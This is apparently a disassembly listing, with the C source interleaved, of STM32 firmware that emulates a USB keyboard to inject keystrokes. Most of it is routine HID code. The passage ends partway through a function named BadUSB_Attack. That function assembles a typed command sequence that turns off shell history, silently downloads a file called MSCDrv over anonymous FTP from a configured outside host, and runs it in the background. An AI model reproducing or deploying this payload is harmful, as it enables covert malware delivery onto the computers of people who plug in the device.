	uint8_t pos = Map[ascii];
 800063e:	79fb      	ldrb	r3, [r7, #7]
 8000640:	3390      	adds	r3, #144	; 0x90
 8000642:	443b      	add	r3, r7
 8000644:	f813 3c88 	ldrb.w	r3, [r3, #-136]
 8000648:	f887 308f 	strb.w	r3, [r7, #143]	; 0x8f
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 800064c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000650:	091b      	lsrs	r3, r3, #4
 8000652:	b2db      	uxtb	r3, r3
 8000654:	461a      	mov	r2, r3
 8000656:	4b13      	ldr	r3, [pc, #76]	; (80006a4 <Get_Single_Descriptor+0x94>)
 8000658:	5c9b      	ldrb	r3, [r3, r2]
 800065a:	b25a      	sxtb	r2, r3
 800065c:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000660:	f003 0307 	and.w	r3, r3, #7
 8000664:	2101      	movs	r1, #1
 8000666:	fa01 f303 	lsl.w	r3, r1, r3
 800066a:	b25b      	sxtb	r3, r3
 800066c:	4313      	orrs	r3, r2
 800066e:	b259      	sxtb	r1, r3
 8000670:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000674:	091b      	lsrs	r3, r3, #4
 8000676:	b2db      	uxtb	r3, r3
 8000678:	461a      	mov	r2, r3
 800067a:	b2c9      	uxtb	r1, r1
 800067c:	4b09      	ldr	r3, [pc, #36]	; (80006a4 <Get_Single_Descriptor+0x94>)
 800067e:	5499      	strb	r1, [r3, r2]
	if((pos&0x08) == 8)
 8000680:	f897 308f 	ldrb.w	r3, [r7, #143]	; 0x8f
 8000684:	f003 0308 	and.w	r3, r3, #8
 8000688:	2b00      	cmp	r3, #0
 800068a:	d006      	beq.n	800069a <Get_Single_Descriptor+0x8a>
		sent_buffer[0] |= 0x02;
 800068c:	4b05      	ldr	r3, [pc, #20]	; (80006a4 <Get_Single_Descriptor+0x94>)
 800068e:	781b      	ldrb	r3, [r3, #0]
 8000690:	f043 0302 	orr.w	r3, r3, #2
 8000694:	b2da      	uxtb	r2, r3
 8000696:	4b03      	ldr	r3, [pc, #12]	; (80006a4 <Get_Single_Descriptor+0x94>)
 8000698:	701a      	strb	r2, [r3, #0]
}
 800069a:	bf00      	nop
 800069c:	3790      	adds	r7, #144	; 0x90
 800069e:	46bd      	mov	sp, r7
 80006a0:	bd80      	pop	{r7, pc}
 80006a2:	bf00      	nop
 80006a4:	2000025c 	.word	0x2000025c
 80006a8:	0800d2f0 	.word	0x0800d2f0

080006ac <Get_Multi_Descriptor>:

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
 80006ac:	b580      	push	{r7, lr}
 80006ae:	b0a6      	sub	sp, #152	; 0x98
 80006b0:	af00      	add	r7, sp, #0
 80006b2:	6078      	str	r0, [r7, #4]
 80006b4:	6039      	str	r1, [r7, #0]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80006b6:	220f      	movs	r2, #15
 80006b8:	2100      	movs	r1, #0
 80006ba:	482a      	ldr	r0, [pc, #168]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 80006bc:	f00c fdd2 	bl	800d264 <memset>
	uint8_t Map[MapLen] = Map_Init;
 80006c0:	4a29      	ldr	r2, [pc, #164]	; (8000768 <Get_Multi_Descriptor+0xbc>)
 80006c2:	f107 030c 	add.w	r3, r7, #12
 80006c6:	4611      	mov	r1, r2
 80006c8:	2286      	movs	r2, #134	; 0x86
 80006ca:	4618      	mov	r0, r3
 80006cc:	f00c fdf6 	bl	800d2bc <memcpy>
	Convert2CapsMap(Map);
 80006d0:	f107 030c 	add.w	r3, r7, #12
 80006d4:	4618      	mov	r0, r3
 80006d6:	f000 f8f1 	bl	80008bc <Convert2CapsMap>
	for(int i = 0; i < num; i++){
 80006da:	2300      	movs	r3, #0
 80006dc:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 80006e0:	e036      	b.n	8000750 <Get_Multi_Descriptor+0xa4>
		uint8_t pos = Map[array[i]];
 80006e2:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 80006e6:	687a      	ldr	r2, [r7, #4]
 80006e8:	4413      	add	r3, r2
 80006ea:	781b      	ldrb	r3, [r3, #0]
 80006ec:	3398      	adds	r3, #152	; 0x98
 80006ee:	443b      	add	r3, r7
 80006f0:	f813 3c8c 	ldrb.w	r3, [r3, #-140]
 80006f4:	f887 3093 	strb.w	r3, [r7, #147]	; 0x93
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 80006f8:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 80006fc:	091b      	lsrs	r3, r3, #4
 80006fe:	b2db      	uxtb	r3, r3
 8000700:	461a      	mov	r2, r3
 8000702:	4b18      	ldr	r3, [pc, #96]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 8000704:	5c9b      	ldrb	r3, [r3, r2]
 8000706:	b25a      	sxtb	r2, r3
 8000708:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 800070c:	f003 0307 	and.w	r3, r3, #7
 8000710:	2101      	movs	r1, #1
 8000712:	fa01 f303 	lsl.w	r3, r1, r3
 8000716:	b25b      	sxtb	r3, r3
 8000718:	4313      	orrs	r3, r2
 800071a:	b259      	sxtb	r1, r3
 800071c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000720:	091b      	lsrs	r3, r3, #4
 8000722:	b2db      	uxtb	r3, r3
 8000724:	461a      	mov	r2, r3
 8000726:	b2c9      	uxtb	r1, r1
 8000728:	4b0e      	ldr	r3, [pc, #56]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 800072a:	5499      	strb	r1, [r3, r2]
		if((pos&0x08) == 8)
 800072c:	f897 3093 	ldrb.w	r3, [r7, #147]	; 0x93
 8000730:	f003 0308 	and.w	r3, r3, #8
 8000734:	2b00      	cmp	r3, #0
 8000736:	d006      	beq.n	8000746 <Get_Multi_Descriptor+0x9a>
			sent_buffer[0] |= 0x02;
 8000738:	4b0a      	ldr	r3, [pc, #40]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 800073a:	781b      	ldrb	r3, [r3, #0]
 800073c:	f043 0302 	orr.w	r3, r3, #2
 8000740:	b2da      	uxtb	r2, r3
 8000742:	4b08      	ldr	r3, [pc, #32]	; (8000764 <Get_Multi_Descriptor+0xb8>)
 8000744:	701a      	strb	r2, [r3, #0]
	for(int i = 0; i < num; i++){
 8000746:	f8d7 3094 	ldr.w	r3, [r7, #148]	; 0x94
 800074a:	3301      	adds	r3, #1
 800074c:	f8c7 3094 	str.w	r3, [r7, #148]	; 0x94
 8000750:	f8d7 2094 	ldr.w	r2, [r7, #148]	; 0x94
 8000754:	683b      	ldr	r3, [r7, #0]
 8000756:	429a      	cmp	r2, r3
 8000758:	dbc3      	blt.n	80006e2 <Get_Multi_Descriptor+0x36>
	}
}
 800075a:	bf00      	nop
 800075c:	bf00      	nop
 800075e:	3798      	adds	r7, #152	; 0x98
 8000760:	46bd      	mov	sp, r7
 8000762:	bd80      	pop	{r7, pc}
 8000764:	2000025c 	.word	0x2000025c
 8000768:	0800d2f0 	.word	0x0800d2f0

0800076c <SimulateKeyPress>:

void SimulateKeyPress(uint8_t ascii){
 800076c:	b580      	push	{r7, lr}
 800076e:	b082      	sub	sp, #8
 8000770:	af00      	add	r7, sp, #0
 8000772:	4603      	mov	r3, r0
 8000774:	71fb      	strb	r3, [r7, #7]
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
 8000776:	79fb      	ldrb	r3, [r7, #7]
 8000778:	4618      	mov	r0, r3
 800077a:	f7ff ff49 	bl	8000610 <Get_Single_Descriptor>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800077e:	220f      	movs	r2, #15
 8000780:	4903      	ldr	r1, [pc, #12]	; (8000790 <SimulateKeyPress+0x24>)
 8000782:	4804      	ldr	r0, [pc, #16]	; (8000794 <SimulateKeyPress+0x28>)
 8000784:	f008 fa74 	bl	8008c70 <USBD_CUSTOM_HID_SendReport>
}
 8000788:	bf00      	nop
 800078a:	3708      	adds	r7, #8
 800078c:	46bd      	mov	sp, r7
 800078e:	bd80      	pop	{r7, pc}
 8000790:	2000025c 	.word	0x2000025c
 8000794:	200003c0 	.word	0x200003c0

08000798 <SimulateKeyRelease>:

void SimulateKeyRelease(){
 8000798:	b580      	push	{r7, lr}
 800079a:	af00      	add	r7, sp, #0
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800079c:	220f      	movs	r2, #15
 800079e:	2100      	movs	r1, #0
 80007a0:	4804      	ldr	r0, [pc, #16]	; (80007b4 <SimulateKeyRelease+0x1c>)
 80007a2:	f00c fd5f 	bl	800d264 <memset>
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80007a6:	220f      	movs	r2, #15
 80007a8:	4902      	ldr	r1, [pc, #8]	; (80007b4 <SimulateKeyRelease+0x1c>)
 80007aa:	4803      	ldr	r0, [pc, #12]	; (80007b8 <SimulateKeyRelease+0x20>)
 80007ac:	f008 fa60 	bl	8008c70 <USBD_CUSTOM_HID_SendReport>
}
 80007b0:	bf00      	nop
 80007b2:	bd80      	pop	{r7, pc}
 80007b4:	2000025c 	.word	0x2000025c
 80007b8:	200003c0 	.word	0x200003c0

080007bc <SimulateKeyStroke>:

void SimulateKeyStroke(uint8_t ascii){
 80007bc:	b580      	push	{r7, lr}
 80007be:	b082      	sub	sp, #8
 80007c0:	af00      	add	r7, sp, #0
 80007c2:	4603      	mov	r3, r0
 80007c4:	71fb      	strb	r3, [r7, #7]
	SimulateKeyPress(ascii);
 80007c6:	79fb      	ldrb	r3, [r7, #7]
 80007c8:	4618      	mov	r0, r3
 80007ca:	f7ff ffcf 	bl	800076c <SimulateKeyPress>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80007ce:	2023      	movs	r0, #35	; 0x23
 80007d0:	f000 fe3e 	bl	8001450 <HAL_Delay>
	SimulateKeyRelease();
 80007d4:	f7ff ffe0 	bl	8000798 <SimulateKeyRelease>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 80007d8:	2023      	movs	r0, #35	; 0x23
 80007da:	f000 fe39 	bl	8001450 <HAL_Delay>
}
 80007de:	bf00      	nop
 80007e0:	3708      	adds	r7, #8
 80007e2:	46bd      	mov	sp, r7
 80007e4:	bd80      	pop	{r7, pc}
	...

080007e8 <SimulateShortcutKey>:

void SimulateShortcutKey(uint8_t *array, int num){
 80007e8:	b580      	push	{r7, lr}
 80007ea:	b082      	sub	sp, #8
 80007ec:	af00      	add	r7, sp, #0
 80007ee:	6078      	str	r0, [r7, #4]
 80007f0:	6039      	str	r1, [r7, #0]
	Get_Multi_Descriptor(array, num);
 80007f2:	6839      	ldr	r1, [r7, #0]
 80007f4:	6878      	ldr	r0, [r7, #4]
 80007f6:	f7ff ff59 	bl	80006ac <Get_Multi_Descriptor>
	while((recv_buffer[0]&0x02) != 0x02){
 80007fa:	e002      	b.n	8000802 <SimulateShortcutKey+0x1a>
		SimulateKeyStroke(128);
 80007fc:	2080      	movs	r0, #128	; 0x80
 80007fe:	f7ff ffdd 	bl	80007bc <SimulateKeyStroke>
	while((recv_buffer[0]&0x02) != 0x02){
 8000802:	4b0c      	ldr	r3, [pc, #48]	; (8000834 <SimulateShortcutKey+0x4c>)
 8000804:	781b      	ldrb	r3, [r3, #0]
 8000806:	f003 0302 	and.w	r3, r3, #2
 800080a:	2b00      	cmp	r3, #0
 800080c:	d0f6      	beq.n	80007fc <SimulateShortcutKey+0x14>
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800080e:	220f      	movs	r2, #15
 8000810:	4909      	ldr	r1, [pc, #36]	; (8000838 <SimulateShortcutKey+0x50>)
 8000812:	480a      	ldr	r0, [pc, #40]	; (800083c <SimulateShortcutKey+0x54>)
 8000814:	f008 fa2c 	bl	8008c70 <USBD_CUSTOM_HID_SendReport>
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 8000818:	2023      	movs	r0, #35	; 0x23
 800081a:	f000 fe19 	bl	8001450 <HAL_Delay>
	SimulateKeyRelease();
 800081e:	f7ff ffbb 	bl	8000798 <SimulateKeyRelease>
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
 8000822:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000826:	f000 fe13 	bl	8001450 <HAL_Delay>
}
 800082a:	bf00      	nop
 800082c:	3708      	adds	r7, #8
 800082e:	46bd      	mov	sp, r7
 8000830:	bd80      	pop	{r7, pc}
 8000832:	bf00      	nop
 8000834:	2000026c 	.word	0x2000026c
 8000838:	2000025c 	.word	0x2000025c
 800083c:	200003c0 	.word	0x200003c0

08000840 <SimulateKeyStrokes>:

void SimulateKeyStrokes(char *str, int len, int *cntNow){
 8000840:	b580      	push	{r7, lr}
 8000842:	b084      	sub	sp, #16
 8000844:	af00      	add	r7, sp, #0
 8000846:	60f8      	str	r0, [r7, #12]
 8000848:	60b9      	str	r1, [r7, #8]
 800084a:	607a      	str	r2, [r7, #4]
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 800084c:	687b      	ldr	r3, [r7, #4]
 800084e:	2200      	movs	r2, #0
 8000850:	601a      	str	r2, [r3, #0]
 8000852:	e025      	b.n	80008a0 <SimulateKeyStrokes+0x60>
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
 8000854:	4b17      	ldr	r3, [pc, #92]	; (80008b4 <SimulateKeyStrokes+0x74>)
 8000856:	781b      	ldrb	r3, [r3, #0]
 8000858:	f003 0302 	and.w	r3, r3, #2
 800085c:	2b00      	cmp	r3, #0
 800085e:	d102      	bne.n	8000866 <SimulateKeyStrokes+0x26>
			SimulateKeyStroke(128);
 8000860:	2080      	movs	r0, #128	; 0x80
 8000862:	f7ff ffab 	bl	80007bc <SimulateKeyStroke>
    	}
		SimulateKeyStroke(str[*cntNow]);
 8000866:	687b      	ldr	r3, [r7, #4]
 8000868:	681b      	ldr	r3, [r3, #0]
 800086a:	461a      	mov	r2, r3
 800086c:	68fb      	ldr	r3, [r7, #12]
 800086e:	4413      	add	r3, r2
 8000870:	781b      	ldrb	r3, [r3, #0]
 8000872:	4618      	mov	r0, r3
 8000874:	f7ff ffa2 	bl	80007bc <SimulateKeyStroke>
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
 8000878:	4b0f      	ldr	r3, [pc, #60]	; (80008b8 <SimulateKeyStrokes+0x78>)
 800087a:	681b      	ldr	r3, [r3, #0]
 800087c:	2b01      	cmp	r3, #1
 800087e:	d10a      	bne.n	8000896 <SimulateKeyStrokes+0x56>
			NeedRollBack = 0;
 8000880:	4b0d      	ldr	r3, [pc, #52]	; (80008b8 <SimulateKeyStrokes+0x78>)
 8000882:	2200      	movs	r2, #0
 8000884:	601a      	str	r2, [r3, #0]
			(*cntNow)--;
 8000886:	687b      	ldr	r3, [r7, #4]
 8000888:	681b      	ldr	r3, [r3, #0]
 800088a:	1e5a      	subs	r2, r3, #1
 800088c:	687b      	ldr	r3, [r7, #4]
 800088e:	601a      	str	r2, [r3, #0]
			SimulateKeyStroke(129);
 8000890:	2081      	movs	r0, #129	; 0x81
 8000892:	f7ff ff93 	bl	80007bc <SimulateKeyStroke>
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
 8000896:	687b      	ldr	r3, [r7, #4]
 8000898:	681b      	ldr	r3, [r3, #0]
 800089a:	1c5a      	adds	r2, r3, #1
 800089c:	687b      	ldr	r3, [r7, #4]
 800089e:	601a      	str	r2, [r3, #0]
 80008a0:	687b      	ldr	r3, [r7, #4]
 80008a2:	681b      	ldr	r3, [r3, #0]
 80008a4:	68ba      	ldr	r2, [r7, #8]
 80008a6:	429a      	cmp	r2, r3
 80008a8:	dcd4      	bgt.n	8000854 <SimulateKeyStrokes+0x14>
		}
	}
}
 80008aa:	bf00      	nop
 80008ac:	bf00      	nop
 80008ae:	3710      	adds	r7, #16
 80008b0:	46bd      	mov	sp, r7
 80008b2:	bd80      	pop	{r7, pc}
 80008b4:	2000026c 	.word	0x2000026c
 80008b8:	2000027c 	.word	0x2000027c

080008bc <Convert2CapsMap>:
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
 80008bc:	b480      	push	{r7}
 80008be:	b085      	sub	sp, #20
 80008c0:	af00      	add	r7, sp, #0
 80008c2:	6078      	str	r0, [r7, #4]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 80008c4:	2341      	movs	r3, #65	; 0x41
 80008c6:	73fb      	strb	r3, [r7, #15]
 80008c8:	e01a      	b.n	8000900 <Convert2CapsMap+0x44>
		LowerCaseMap[cnt] &= 0xf7;
 80008ca:	7bfb      	ldrb	r3, [r7, #15]
 80008cc:	687a      	ldr	r2, [r7, #4]
 80008ce:	4413      	add	r3, r2
 80008d0:	781a      	ldrb	r2, [r3, #0]
 80008d2:	7bfb      	ldrb	r3, [r7, #15]
 80008d4:	6879      	ldr	r1, [r7, #4]
 80008d6:	440b      	add	r3, r1
 80008d8:	f022 0208 	bic.w	r2, r2, #8
 80008dc:	b2d2      	uxtb	r2, r2
 80008de:	701a      	strb	r2, [r3, #0]
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
 80008e0:	7bfb      	ldrb	r3, [r7, #15]
 80008e2:	3320      	adds	r3, #32
 80008e4:	687a      	ldr	r2, [r7, #4]
 80008e6:	4413      	add	r3, r2
 80008e8:	781a      	ldrb	r2, [r3, #0]
 80008ea:	7bfb      	ldrb	r3, [r7, #15]
 80008ec:	3320      	adds	r3, #32
 80008ee:	6879      	ldr	r1, [r7, #4]
 80008f0:	440b      	add	r3, r1
 80008f2:	f042 0208 	orr.w	r2, r2, #8
 80008f6:	b2d2      	uxtb	r2, r2
 80008f8:	701a      	strb	r2, [r3, #0]
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
 80008fa:	7bfb      	ldrb	r3, [r7, #15]
 80008fc:	3301      	adds	r3, #1
 80008fe:	73fb      	strb	r3, [r7, #15]
 8000900:	7bfb      	ldrb	r3, [r7, #15]
 8000902:	2b5a      	cmp	r3, #90	; 0x5a
 8000904:	d9e1      	bls.n	80008ca <Convert2CapsMap+0xe>
	}
}
 8000906:	bf00      	nop
 8000908:	bf00      	nop
 800090a:	3714      	adds	r7, #20
 800090c:	46bd      	mov	sp, r7
 800090e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000912:	4770      	bx	lr

08000914 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000914:	b580      	push	{r7, lr}
 8000916:	b082      	sub	sp, #8
 8000918:	af00      	add	r7, sp, #0
 800091a:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 800091c:	687b      	ldr	r3, [r7, #4]
 800091e:	681b      	ldr	r3, [r3, #0]
 8000920:	2b01      	cmp	r3, #1
 8000922:	d10f      	bne.n	8000944 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000924:	687b      	ldr	r3, [r7, #4]
 8000926:	2200      	movs	r2, #0
 8000928:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 800092a:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 800092e:	695b      	ldr	r3, [r3, #20]
 8000930:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000934:	f043 0301 	orr.w	r3, r3, #1
 8000938:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 800093a:	f000 fbdf 	bl	80010fc <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 800093e:	4803      	ldr	r0, [pc, #12]	; (800094c <InterruptTrap+0x38>)
 8000940:	f004 fb28 	bl	8004f94 <HAL_TIM_Base_Start_IT>
	}
}
 8000944:	bf00      	nop
 8000946:	3708      	adds	r7, #8
 8000948:	46bd      	mov	sp, r7
 800094a:	bd80      	pop	{r7, pc}
 800094c:	200002e4 	.word	0x200002e4

08000950 <TestHID>:

int TestHID(){
 8000950:	b580      	push	{r7, lr}
 8000952:	b082      	sub	sp, #8
 8000954:	af00      	add	r7, sp, #0
	char testStr[4] = {133, 133, 133, 133};
 8000956:	f04f 3385 	mov.w	r3, #2240120197	; 0x85858585
 800095a:	603b      	str	r3, [r7, #0]
	SimulateKeyStroke(133);
 800095c:	2085      	movs	r0, #133	; 0x85
 800095e:	f7ff ff2d 	bl	80007bc <SimulateKeyStroke>
	uint8_t PrevState = recv_buffer[0]&0x01;
 8000962:	4b0d      	ldr	r3, [pc, #52]	; (8000998 <TestHID+0x48>)
 8000964:	781b      	ldrb	r3, [r3, #0]
 8000966:	f003 0301 	and.w	r3, r3, #1
 800096a:	71fb      	strb	r3, [r7, #7]
	SimulateKeyStrokes(testStr, 4, &PrintCnt);
 800096c:	463b      	mov	r3, r7
 800096e:	4a0b      	ldr	r2, [pc, #44]	; (800099c <TestHID+0x4c>)
 8000970:	2104      	movs	r1, #4
 8000972:	4618      	mov	r0, r3
 8000974:	f7ff ff64 	bl	8000840 <SimulateKeyStrokes>
	uint8_t CurrState = recv_buffer[0]&0x01;
 8000978:	4b07      	ldr	r3, [pc, #28]	; (8000998 <TestHID+0x48>)
 800097a:	781b      	ldrb	r3, [r3, #0]
 800097c:	f003 0301 	and.w	r3, r3, #1
 8000980:	71bb      	strb	r3, [r7, #6]
	return PrevState == CurrState;
 8000982:	79fa      	ldrb	r2, [r7, #7]
 8000984:	79bb      	ldrb	r3, [r7, #6]
 8000986:	429a      	cmp	r2, r3
 8000988:	bf0c      	ite	eq
 800098a:	2301      	moveq	r3, #1
 800098c:	2300      	movne	r3, #0
 800098e:	b2db      	uxtb	r3, r3
}
 8000990:	4618      	mov	r0, r3
 8000992:	3708      	adds	r7, #8
 8000994:	46bd      	mov	sp, r7
 8000996:	bd80      	pop	{r7, pc}
 8000998:	2000026c 	.word	0x2000026c
 800099c:	20000278 	.word	0x20000278

080009a0 <BadUSB_Attack>:

void BadUSB_Attack(int stage){
 80009a0:	b5b0      	push	{r4, r5, r7, lr}
 80009a2:	b0c4      	sub	sp, #272	; 0x110
 80009a4:	af00      	add	r7, sp, #0
 80009a6:	f507 7388 	add.w	r3, r7, #272	; 0x110
 80009aa:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 80009ae:	6018      	str	r0, [r3, #0]
#if Target == FPGA
	if(stage == 0){
 80009b0:	f507 7388 	add.w	r3, r7, #272	; 0x110
 80009b4:	f5a3 7386 	sub.w	r3, r3, #268	; 0x10c
 80009b8:	681b      	ldr	r3, [r3, #0]
 80009ba:	2b00      	cmp	r3, #0
 80009bc:	f040 80b7 	bne.w	8000b2e <BadUSB_Attack+0x18e>
		uint8_t Terminal[3] = LinuxTerminal;
 80009c0:	4abb      	ldr	r2, [pc, #748]	; (8000cb0 <BadUSB_Attack+0x310>)
 80009c2:	f507 7386 	add.w	r3, r7, #268	; 0x10c
 80009c6:	6812      	ldr	r2, [r2, #0]
 80009c8:	4611      	mov	r1, r2
 80009ca:	8019      	strh	r1, [r3, #0]
 80009cc:	3302      	adds	r3, #2
 80009ce:	0c12      	lsrs	r2, r2, #16
 80009d0:	701a      	strb	r2, [r3, #0]
		char AttackStr0[256] = {'\0'};
 80009d2:	f507 7388 	add.w	r3, r7, #272	; 0x110
 80009d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80009da:	2200      	movs	r2, #0
 80009dc:	601a      	str	r2, [r3, #0]
 80009de:	3304      	adds	r3, #4
 80009e0:	22fc      	movs	r2, #252	; 0xfc
 80009e2:	2100      	movs	r1, #0
 80009e4:	4618      	mov	r0, r3
 80009e6:	f00c fc3d 	bl	800d264 <memset>
		strcat(AttackStr0, "set +o history\n");
 80009ea:	f107 0308 	add.w	r3, r7, #8
 80009ee:	4618      	mov	r0, r3
 80009f0:	f7ff fbec 	bl	80001cc <strlen>
 80009f4:	4603      	mov	r3, r0
 80009f6:	461a      	mov	r2, r3
 80009f8:	f107 0308 	add.w	r3, r7, #8
 80009fc:	4413      	add	r3, r2
 80009fe:	4aad      	ldr	r2, [pc, #692]	; (8000cb4 <BadUSB_Attack+0x314>)
 8000a00:	461c      	mov	r4, r3
 8000a02:	4615      	mov	r5, r2
 8000a04:	cd0f      	ldmia	r5!, {r0, r1, r2, r3}
 8000a06:	6020      	str	r0, [r4, #0]
 8000a08:	6061      	str	r1, [r4, #4]
 8000a0a:	60a2      	str	r2, [r4, #8]
 8000a0c:	60e3      	str	r3, [r4, #12]
		strcat(AttackStr0, "cd /home/user/Templates\n");
 8000a0e:	f107 0308 	add.w	r3, r7, #8
 8000a12:	4618      	mov	r0, r3
 8000a14:	f7ff fbda 	bl	80001cc <strlen>
 8000a18:	4603      	mov	r3, r0
 8000a1a:	461a      	mov	r2, r3
 8000a1c:	f107 0308 	add.w	r3, r7, #8
 8000a20:	4413      	add	r3, r2
 8000a22:	4aa5      	ldr	r2, [pc, #660]	; (8000cb8 <BadUSB_Attack+0x318>)
 8000a24:	461d      	mov	r5, r3
 8000a26:	4614      	mov	r4, r2
 8000a28:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000a2a:	6028      	str	r0, [r5, #0]
 8000a2c:	6069      	str	r1, [r5, #4]
 8000a2e:	60aa      	str	r2, [r5, #8]
 8000a30:	60eb      	str	r3, [r5, #12]
 8000a32:	cc03      	ldmia	r4!, {r0, r1}
 8000a34:	6128      	str	r0, [r5, #16]
 8000a36:	6169      	str	r1, [r5, #20]
 8000a38:	7823      	ldrb	r3, [r4, #0]
 8000a3a:	762b      	strb	r3, [r5, #24]
		strcat(AttackStr0, "wget -q ftp://anonymous:@");
 8000a3c:	f107 0308 	add.w	r3, r7, #8
 8000a40:	4618      	mov	r0, r3
 8000a42:	f7ff fbc3 	bl	80001cc <strlen>
 8000a46:	4603      	mov	r3, r0
 8000a48:	461a      	mov	r2, r3
 8000a4a:	f107 0308 	add.w	r3, r7, #8
 8000a4e:	4413      	add	r3, r2
 8000a50:	4a9a      	ldr	r2, [pc, #616]	; (8000cbc <BadUSB_Attack+0x31c>)
 8000a52:	461d      	mov	r5, r3
 8000a54:	4614      	mov	r4, r2
 8000a56:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000a58:	6028      	str	r0, [r5, #0]
 8000a5a:	6069      	str	r1, [r5, #4]
 8000a5c:	60aa      	str	r2, [r5, #8]
 8000a5e:	60eb      	str	r3, [r5, #12]
 8000a60:	cc03      	ldmia	r4!, {r0, r1}
 8000a62:	6128      	str	r0, [r5, #16]
 8000a64:	6169      	str	r1, [r5, #20]
 8000a66:	8823      	ldrh	r3, [r4, #0]
 8000a68:	832b      	strh	r3, [r5, #24]
		strcat(AttackStr0, File_Host_Addr);
 8000a6a:	f107 0308 	add.w	r3, r7, #8
 8000a6e:	4618      	mov	r0, r3
 8000a70:	f7ff fbac 	bl	80001cc <strlen>
 8000a74:	4603      	mov	r3, r0
 8000a76:	461a      	mov	r2, r3
 8000a78:	f107 0308 	add.w	r3, r7, #8
 8000a7c:	4413      	add	r3, r2
 8000a7e:	4a90      	ldr	r2, [pc, #576]	; (8000cc0 <BadUSB_Attack+0x320>)
 8000a80:	461c      	mov	r4, r3
 8000a82:	4613      	mov	r3, r2
 8000a84:	cb07      	ldmia	r3!, {r0, r1, r2}
 8000a86:	6020      	str	r0, [r4, #0]
 8000a88:	6061      	str	r1, [r4, #4]
 8000a8a:	60a2      	str	r2, [r4, #8]
 8000a8c:	881b      	ldrh	r3, [r3, #0]
 8000a8e:	81a3      	strh	r3, [r4, #12]
		strcat(AttackStr0, "/MSCDrv >/dev/null 2>&1 &\n");
 8000a90:	f107 0308 	add.w	r3, r7, #8
 8000a94:	4618      	mov	r0, r3
 8000a96:	f7ff fb99 	bl	80001cc <strlen>
 8000a9a:	4603      	mov	r3, r0
 8000a9c:	461a      	mov	r2, r3
 8000a9e:	f107 0308 	add.w	r3, r7, #8
 8000aa2:	4413      	add	r3, r2
 8000aa4:	4a87      	ldr	r2, [pc, #540]	; (8000cc4 <BadUSB_Attack+0x324>)
 8000aa6:	461d      	mov	r5, r3
 8000aa8:	4614      	mov	r4, r2
 8000aaa:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8000aac:	6028      	str	r0, [r5, #0]
 8000aae:	6069      	str	r1, [r5, #4]
 8000ab0:	60aa      	str	r2, [r5, #8]
 8000ab2:	60eb      	str	r3, [r5, #12]
 8000ab4:	cc03      	ldmia	r4!, {r0, r1}
 8000ab6:	6128      	str	r0, [r5, #16]
 8000ab8:	6169      	str	r1, [r5, #20]
 8000aba:	8823      	ldrh	r3, [r4, #0]
 8000abc:	78a2      	ldrb	r2, [r4, #2]
 8000abe:	832b      	strh	r3, [r5, #24]
 8000ac0:	4613      	mov	r3, r2
 8000ac2:	76ab      	strb	r3, [r5, #26]
		strcat(AttackStr0, "set -o history\n");
 8000ac4:	f107 0308 	add.w	r3, r7, #8
 8000ac8:	4618      	mov	r0, r3
